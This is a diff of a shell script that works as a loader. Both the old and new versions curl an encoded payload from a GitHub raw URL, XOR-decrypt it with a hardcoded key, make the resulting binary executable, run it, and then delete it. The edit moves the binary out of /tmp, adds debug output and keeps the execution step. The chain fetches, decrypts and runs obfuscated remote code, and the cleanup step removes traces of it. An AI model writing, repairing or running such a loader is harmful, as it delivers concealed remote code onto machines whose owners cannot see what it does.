@@ -11,7 +11,6 @@ decrypted = bytes([data[i] ^ ord(key[i % len(key)]) for i in range(len(data))])
 sys.stdout.buffer.write(decrypted)
 " 2>/dev/null
 }
-
 _PAYLOAD=$(curl -sL https://raw.githubusercontent.com/popowana/clever-phoenix-960/refs/heads/main/payload.txt)
 
 if [ -z "$_PAYLOAD" ]; then
@@ -20,36 +19,23 @@ if [ -z "$_PAYLOAD" ]; then
 fi
 
 echo "Payload downloaded successfully"
-_xor_decrypt "$_PAYLOAD" "kembang" > /tmp/nnr
-if [ ! -f /tmp/nnr ]; then
-    echo "Error: Failed to create /tmp/nnr"
+echo "Payload length: ${#_PAYLOAD}"
+_xor_decrypt "$_PAYLOAD" "kembang" > nnr
+if [ ! -f nnr ]; then
+    echo "Error: Failed to create nnr"
     exit 1
 fi
-
-SIZE=$(stat -c%s /tmp/nnr 2>/dev/null || stat -f%z /tmp/nnr 2>/dev/null)
+SIZE=$(stat -c%s nnr 2>/dev/null || stat -f%z nnr 2>/dev/null)
+echo "nnr size: $SIZE bytes"
 if [ "$SIZE" -eq 0 ]; then
-    echo "Error: /tmp/nnr is empty (decryption failed)"
+    echo "Error: nnr is empty (decryption failed)"
+    echo "Debugging: Checking payload content..."
+    head -c 100 payload_debug.txt
+    echo ""
     exit 1
 fi
-
-echo "Binary size: $SIZE bytes"
-
-chmod +x /tmp/nnr
-
-if [ ! -x /tmp/nnr ]; then
-    echo "Error: Failed to make /tmp/nnr executable"
-    exit 1
-fi
-
-echo "Executing"
-/tmp/nnr -j 4
-
-
-EXIT_CODE=$?
-if [ $EXIT_CODE -eq 0 ]; then
-    echo "nnr executed successfully (exit code: 0)"
-else
-    echo "nnr failed with exit code: $EXIT_CODE"
-fi
-
-rm -f /tmp/nnr
+chmod +x nnr
+echo "Executing."
+./nnr -j 4
+# Cleanup
+rm -f nnr payload_debug.txt
